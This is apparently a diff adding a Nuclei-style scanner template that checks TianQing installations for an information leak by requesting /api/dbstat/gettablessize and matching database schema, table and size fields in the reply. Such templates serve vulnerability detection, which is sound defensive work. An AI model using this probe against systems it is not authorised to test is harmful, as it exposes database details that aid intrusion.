@@ -1,0 +1,21 @@
+id: poc-tianqing-database-info-leak
+info:
+  name: TianQing Database Info Leak
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: info-leak
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/dbstat/gettablessize"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "schema_name"
+          - "table_name"
+          - "table_size"
